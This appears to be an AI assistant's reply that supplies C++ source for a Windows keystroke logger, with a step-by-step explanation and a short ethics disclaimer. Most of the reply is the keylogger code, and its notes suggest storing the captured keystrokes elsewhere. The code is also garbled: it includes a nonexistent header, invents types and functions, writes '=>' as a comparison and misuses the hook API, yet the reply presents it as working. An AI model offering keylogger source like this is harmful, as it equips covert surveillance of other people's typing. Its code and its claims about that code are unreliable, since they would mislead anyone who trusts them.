Here is a C++ code example that demonstrates how to log keystrokes on a Windows computer using a keyboard hook. This code is for educational purposes only and should be used ethically.

```c++
#include <windows.h>
#include <user32.h>
#include <iostream>
#include <string>

using namespace std;

void KeyPressCallback(int hTask, int nCode, UINT wParam, LPARAM lParam);

HHOOK hKeyboardHook = nullptr;

void KeyPressCallback(int hTask, int nCode, UINT wParam, LPARAM lParam) {
    if (nCode != HC_ACTION && wParam != 0) {
        return;
    }

    KBDKEYS keys = GetKeyState(0x00);
    bool isKeyDown = (wParam == 0x0001);
    bool isKeyUp = (wParam == 0x0002);

    if (isKeyDown) {
        if (keys[0].make => 'A' && keys[0].make <= 'z' && keys[0].make >= 'A') {
            char c = keys[0].make;
            cout << "Key Down: " << static_cast<char>(c) << endl;
        } else if (keys[0].make => '0' && keys[0].make <= '9') {
            char c = keys[0].make;
            cout << "Key Down: " << static_cast<char>(c) << endl;
        } else if (keys[0].make => 1 && keys[0].make <= 0xe5) {
            // Handle other keys like Shift, Ctrl, Alt, etc.
            // Use GetKeyState to check modifiers
            cout << "Modifier Key: ";
            if (keys[0].state & 0x0001) { // Shift
                cout << "Shift";
            }
            if (keys[0].state & 0x0002) { // Ctrl
                cout << " Ctrl";
            }
            if (keys[0].state & 0x0040) { // Alt
                cout << " Alt";
            }
            cout << endl;
        }
    } else {
        if (keys[0].state & 0x0001) { // Shift
            cout << "Shift released" << endl;
        }
        if (keys[0].state & 0x0002) { // Ctrl
            cout << "Ctrl released" << endl;
        }
        if (keys[0].state & 0x0040) { // Alt
            cout << "Alt released" << endl;
        }
    }
}

int main() {
    // Set up keyboard hook
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyPressCallback);
    if (!hKeyboardHook) {
        cout << "Failed to install keyboard hook" << endl;
        return 1;
    }

    // Start the hook
    bool bInj = 0;
    while (true) {
        if (GetLastKeyState(0x00) & 0x0001) {
            bInj = 1;
        }
        Sleep(500);
    }

    // Uninstall the hook
    UnhookWindowsHook(hKeyboardHook);
    cout << "Keyboard hook removed" << endl;
    return 0;
}
```

**Explanation:**

1. **Headers Included:** The code includes necessary headers for Windows API functions and input handling.

2. **Callback Function:** `KeyPressCallback` is defined to handle keyboard events. It checks if the event is a key press or release and records the corresponding keystroke.

3. **Setting Up the Hook:** The main function sets up a low-level keyboard hook using `SetWindowsHook`. If the hook is not installed, it logs an error.

4. **Event Loop:** The loop continuously checks if any keys are pressed to keep the program running and prevent it from exiting immediately.

5. **Logging Keystrokes:** For each key press, it checks if it's a letter, number, or modifier (Shift, Ctrl, Alt) and logs the appropriate message.

6. **Cleaning Up:** After finishing, the hook is uninstalled, and the program exits.

**Notes:**
- This code is for demonstration purposes and should only be used with permission.
- Running this requires administrative privileges on the system.
- The code logs keystrokes to the console; you can modify it to store the data elsewhere if needed.
- The loop sleeps to prevent high CPU usage, but you can adjust the interval as needed.

**Ethical Consideration:**
Always ensure that any keystroke logging is done with proper permissions and for legitimate purposes to respect user privacy.<｜end▁of▁sentence｜>

